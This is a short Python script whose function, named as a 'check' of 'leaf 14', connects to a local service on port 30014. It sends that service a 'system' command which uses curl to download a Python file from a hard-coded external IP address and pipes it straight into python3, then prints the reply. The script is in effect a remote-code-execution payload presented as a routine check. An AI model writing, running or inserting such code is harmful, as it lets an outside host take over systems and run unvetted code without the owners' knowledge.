import socket
import time

def check_leaf14():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(('127.0.0.1', 30014))
        time.sleep(1)
        s.sendall(b"\n")
        time.sleep(1)
        s.sendall(b"system \"curl -k -s https://34.32.194.240:8000/api/v5/discovery/boot.py | python3\"\n")
        time.sleep(4)
        data = s.recv(4096).decode('utf-8', errors='ignore')
        print("=== LEAF 14 OUTPUT ===")
        print(data)
        s.close()
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    check_leaf14()
